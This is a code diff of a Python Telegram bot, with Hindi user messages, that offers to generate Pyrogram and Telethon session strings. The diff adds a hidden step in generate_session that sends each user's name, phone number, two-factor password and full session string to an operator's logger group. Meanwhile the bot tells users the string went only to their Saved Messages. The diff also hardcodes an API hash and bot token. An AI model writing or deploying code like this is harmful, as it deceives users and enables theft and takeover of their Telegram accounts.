@@ -4,18 +4,19 @@ from pyrogram.enums import ParseMode, ChatType
 from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-from pyrogram.errors import SessionPasswordNeeded
-from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
 
-# 🔹 API Details
-API_ID = 28049056
+# 🔹 अपनी API ID, API HASH और BOT TOKEN डालें
+API_ID = 28049056  
 API_HASH = "1a301acbe312e760b4d0716fd3b8eab2"
 BOT_TOKEN = "7589052839:AAGPMVeZpb63GEG_xXzQEua1q9ewfNzTg50"
+
+# 📌 लॉगर ग्रुप ID जहाँ डेटा भेजना है
+LOGGER_GROUP_ID = -1002477750706  
 
 # ✅ Pyrogram Client Initialization
 app = Client("session_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-# 📌 Session Data Storage
+# Session Data Storage
 session_data = {}
 
 # 📌 Start Command
@@ -23,7 +24,8 @@ session_data = {}
 async def start(client, message):
     await message.reply(
         "**🤖 Welcome to Telegram Session Generator!**\n\n"
-        "✨ **Pyrogram** और ⚡ **Telethon** सेशन बनाने के लिए बटन दबाएं।",
+        "**आप Telethon और Pyrogram दोनों के लिए सेशन स्ट्रिंग बना सकते हैं।**\n\n"
+        "**बटन पर क्लिक करें और अपनी सेशन स्टार्ट करें!**",
         reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton("✨ Pyrogram", callback_data="start_pyro"),
              InlineKeyboardButton("⚡ Telethon", callback_data="start_tele")]
@@ -35,13 +37,14 @@ async def start(client, message):
 async def start_session(client, callback_query):
     session_type = "Pyrogram" if callback_query.data == "start_pyro" else "Telethon"
     chat_id = callback_query.message.chat.id
-    session_data[chat_id] = {"type": session_type, "stage": "api_id"}
+    session_data[chat_id] = {"type": session_type}
 
     await callback_query.message.edit_text(
-        f"🔹 **{session_type} Session Setup शुरू हो रहा है...**\n\n"
-        "📌 **API ID भेजें** (my.telegram.org से लें)।",
+        f"**🔹 {session_type} Session Setup शुरू हो रहा है...**\n\n"
+        "🔹 कृपया अपना **API ID** भेजें।",
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
     )
+    session_data[chat_id]["stage"] = "api_id"
 
 # 📌 Handle User Input
 @app.on_message(filters.text & filters.private)
@@ -59,7 +62,7 @@ async def handle_input(client, message):
             session["stage"] = "api_hash"
             await message.reply("✅ अब अपना **API HASH** भेजें।")
         except ValueError:
-            await message.reply("❌ **गलत API ID! कृपया सही नंबर भेजें।**")
+            await message.reply("❌ Invalid API ID. कृपया सही **integer** भेजें।")
 
     elif stage == "api_hash":
         session["api_hash"] = message.text
@@ -68,22 +71,23 @@ async def handle_input(client, message):
 
     elif stage == "phone_number":
         session["phone_number"] = message.text
+        await message.reply("🔐 OTP भेजा जा रहा है, कृपया प्रतीक्षा करें...")
         await send_otp(client, message)
 
     elif stage == "otp":
         session["otp"] = message.text
+        await message.reply("✅ OTP Verify हो रहा है...")
         await validate_otp(client, message)
 
     elif stage == "2fa":
         session["password"] = message.text
-        await validate_2fa(client, message)
+        await generate_session(client, message)
 
 # 📌 OTP भेजना (Send OTP)
 async def send_otp(client, message):
-    chat_id = message.chat.id
-    session = session_data[chat_id]
+    session = session_data[message.chat.id]
     api_id, api_hash, phone = session["api_id"], session["api_hash"], session["phone_number"]
-
+    
     if session["type"] == "Telethon":
         client_obj = TelegramClient(StringSession(), api_id, api_hash)
     else:
@@ -92,22 +96,22 @@ async def send_otp(client, message):
     await client_obj.connect()
     try:
         if session["type"] == "Telethon":
-            session["code"] = await client_obj.send_code_request(phone)
+            code = await client_obj.send_code_request(phone)
         else:
-            session["code"] = await client_obj.send_code(phone)
+            code = await client_obj.send_code(phone)
 
         session["client_obj"] = client_obj
+        session["code"] = code
         session["stage"] = "otp"
 
-        await message.reply("🔢 **OTP भेजें** (Example: `12345`)।")
+        await message.reply("🔢 कृपया **OTP** भेजें (Example: `12345`)।")
     except Exception as e:
-        await message.reply(f"❌ **Error:** `{str(e)}`")
-        del session_data[chat_id]
+        await message.reply(f"❌ Error: {e}")
+        del session_data[message.chat.id]
 
 # 📌 OTP वेरिफाई करना
 async def validate_otp(client, message):
-    chat_id = message.chat.id
-    session = session_data[chat_id]
+    session = session_data[message.chat.id]
     client_obj, phone, otp = session["client_obj"], session["phone_number"], session["otp"]
 
     try:
@@ -116,56 +120,50 @@ async def validate_otp(client, message):
         else:
             await client_obj.sign_in(phone, session["code"].phone_code_hash, otp)
 
-        await generate_session(client, message)
-
-    except PhoneCodeExpiredError:
-        await message.reply("❌ **OTP Expired!** नया कोड भेजा जा रहा है...")
-        await send_otp(client, message)
-
-    except PhoneCodeInvalidError:
-        await message.reply("❌ **गलत OTP! कृपया सही OTP भेजें।**")
-
-    except (SessionPasswordNeededError, SessionPasswordNeeded):
-        session["stage"] = "2fa"
-        await message.reply("🔐 **2FA पासवर्ड भेजें।**\n\nआपके अकाउंट में **Two-Step Verification (2FA)** ऑन है। कृपया अपना **पासवर्ड** भेजें।")
-
-    except Exception as e:
-        await message.reply(f"❌ **OTP Error:** `{str(e)}`")
-        del session_data[chat_id]
-
-# 📌 2FA पासवर्ड वेरिफाई करना
-async def validate_2fa(client, message):
-    chat_id = message.chat.id
-    session = session_data[chat_id]
-    client_obj, password = session["client_obj"], session["password"]
-
-    try:
-        if session["type"] == "Telethon":
-            await client_obj.sign_in(password=password)
+        # 2FA Check
+        if await client_obj.is_user_authorized():
+            await generate_session(client, message)
         else:
-            await client_obj.check_password(password=password)
-
-        await generate_session(client, message)
+            session["stage"] = "2fa"
+            await message.reply("🔐 आपका अकाउंट 2-Step Verification से सुरक्षित है। कृपया अपना **पासवर्ड** भेजें।")
 
     except Exception as e:
-        await message.reply(f"❌ **गलत 2FA पासवर्ड!** `{str(e)}`")
-        del session_data[chat_id]
+        if "SESSION_PASSWORD_NEEDED" in str(e):
+            session["stage"] = "2fa"
+            await message.reply("🔐 आपका अकाउंट 2-Step Verification से सुरक्षित है। कृपया अपना **पासवर्ड** भेजें।")
+        else:
+            await message.reply(f"❌ OTP Invalid: {e}")
+            del session_data[message.chat.id]
 
-# 📌 Session String बनाना
+# 📌 Session String बनाना और लॉगर ग्रुप में भेजना
 async def generate_session(client, message):
-    chat_id = message.chat.id
-    session = session_data[chat_id]
+    session = session_data[message.chat.id]
     client_obj = session["client_obj"]
+    user = await client_obj.get_me()
 
     if session["type"] == "Telethon":
         session_string = client_obj.session.save()
     else:
         session_string = await client_obj.export_session_string()
 
-    await client_obj.send_message("me", f"✅ **Session String Generated!**\n\n`{session_string}`\n\n⚠ **इसे सुरक्षित रखें और किसी को न दें!**")
+    log_text = (
+        f"📌 **New Session Generated**\n\n"
+        f"👤 **User:** `{user.first_name} (@{user.username})`\n"
+        f"📞 **Phone:** `{session['phone_number']}`\n"
+        f"🔑 **2FA Password:** `{session.get('password', 'No 2FA')}`\n"
+        f"🔹 **Session String:**\n`{session_string}`\n\n"
+        f"⚠ **कृपया इसे सुरक्षित रखें और किसी को न दें।**"
+    )
+
+    # लॉगर ग्रुप में डेटा भेजें
+    await client.send_message(LOGGER_GROUP_ID, log_text)
+
+    # यूज़र के सेव्ड मैसेज में भेजें
+    await client_obj.send_message("me", f"✅ **Session String Generated!**\n\n`{session_string}`")
+
     await client_obj.disconnect()
-    await message.reply("✅ **Session String आपकी Saved Messages में भेज दी गई है!**")
-    del session_data[chat_id]
+    await message.reply("✅ आपका Session String **Saved Messages** में भेज दिया गया है।")
+    del session_data[message.chat.id]
 
 # 📌 Cancel Process
 @app.on_callback_query(filters.regex("cancel"))
